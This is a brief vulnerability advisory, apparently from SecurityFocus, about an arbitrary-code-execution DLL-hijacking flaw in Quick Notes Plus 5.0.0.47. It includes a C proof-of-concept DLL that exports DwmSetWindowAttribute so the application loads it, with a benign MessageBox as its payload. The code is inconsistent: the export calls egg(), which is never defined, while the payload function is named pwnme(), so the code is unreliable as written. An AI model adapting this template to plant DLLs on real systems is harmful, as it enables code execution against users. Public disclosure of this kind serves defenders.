source: http://www.securityfocus.com/bid/45689/info

Quick Notes Plus is prone to an arbitrary-code-execution vulnerability.

Attackers can exploit this vulnerability to execute arbitrary code in the context of the user running the vulnerable application.

Quick Notes Plus 5.0.0.47 is vulnerable; other versions may also be affected. 

#include <windows.h>
#define DllExport __declspec (dllexport)
DllExport void DwmSetWindowAttribute() { egg(); }

int pwnme()
{
  MessageBox(0, "dll hijacked !! ", "Dll Message", MB_OK);
  exit(0);
  return 0;
}